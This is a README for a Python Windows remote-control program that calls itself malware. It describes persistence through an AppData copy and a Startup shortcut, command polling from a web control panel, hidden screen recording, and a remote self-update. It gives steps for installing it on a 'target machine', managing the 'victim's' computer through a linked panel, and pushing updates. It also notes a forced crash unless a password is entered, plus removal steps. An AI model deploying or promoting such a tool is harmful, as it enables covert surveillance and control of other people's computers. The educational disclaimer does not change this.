# cslckrwbcl

cslckrwbcl is a Windows desktop web client designed for the cslckr ecosystem. It facilitates a connection between a local workstation and a centralized web-based control panel to execute remote commands from a trusted server.

> This project is intended for educational experimentation and private infrastructure management.

## Key Features

*   **Persistence:** Capable of self-injecting into `%APPDATA%\.cslckrwbcl` and automatically configuring itself as a startup application.
*   **Web Management:** Integrates with the [cslckr Manager App](https://cslckrmngr.lrdevstudio.com), a web-based UI built with Flask.
*   **Command Polling:** Continuously monitors the manager application for new instructions or state changes.
*   **Screen Capture:** Performs background screen recording for activity logging (asynchronous/non-live).
*   **Permission Management:** Stores all local data within the `AppData` directory to ensure operation without elevated administrative privileges.

## Update Mechanism

The client maintains an automated update lifecycle via a secondary executable:

1.  **Download:** Updates are retrieved as temporary binary files.
2.  **Replacement:** A dedicated updater utility replaces the existing client binary to ensure file integrity.
3.  **Initialization:** The client automatically restarts following a successful update.

## Technical Stack

*   **Language:** Python
*   **Packaging:** PyInstaller
*   **Frontend/UI:** pywebview

## Getting started

If you are intrested in installing this malware (with consent) on a machine, this is how you can do it.

1. Start by installing the **cslckrwbcl updater.exe** on the target machine
2. Open the exe and wait around 40 seconds for the program to launch
3. After the cslckrwbcl has launched, enter the password "nexus" to neutralize the malware (otherwise the program will throw a error and windows will BSOD)
4. Go to the [manager app](http://cslckrmngr.lrdevstudio.com) to manage this malware.

> The name of the machine for e.g DESKTOP-4EAL80F will be used to refrence to the machine in the manager app.

The malware does not need administrator privellege and so can run as user and still be deadly.

> Note: If you wanted to update the malware, you can open the manager app, click on the computer, and press "Release update". If the victims computer doesnt start downloading a new file called `cslckrwbcln.exe`, you can download the [updater](https://cslckrwbcl.lrdevstudio.com/resources/cslckrwbcl%20updater.exe) yourself, and run it with the `update` argument by pressing <kbd>Windows</kbd>+<kbd>R</kbd> and typing in `"%userprofile%/Downloads/cslckrwbcl updater.exe" update`

### Removing the malware

If you want to remove the malware, you can:
1. Open task manager and kill the cslckrwbcl.exe if it is runnning
2. Press <kbd>Windows</kbd>+<kbd>R</kbd>
3. Type in ` %appdata%/.cslckrwbcl `
4. This will open the folder in file explorer
5. Delete this folder
5. Then again press <kbd>Windows</kbd>+<kbd>R</kbd>
7. Type in ` %appdata%/Microsoft/Windows/Start Menu/Programs/Startup `
8. Delete the `cslckrwbcl.lnk` file

And now your done. To remove the computer from the manager, click on the computer, and then three dots next to the terminal, upon click will show a list of actions including "Remove this computer". Click that and now the computer will be fully dis-infected from the malware.

## Contributing

Contributions are welcome for educational improvements or feature enhancements.
1. Fork the repository.
2. Create a new feature branch.
3. Submit a pull request with a detailed description of changes.
4. For major changes, please open an issue first to discuss your ideas.

## License

This project is licensed under the [MIT License](https://opensource.org). You are free to use, modify, and distribute the software, provided the original copyright and permission notice are included.

## Disclaimer

This software is intended strictly for educational purposes and personal use on systems owned by the operator or where explicit permission has been granted. Deployment on unauthorized systems is strictly prohibited.
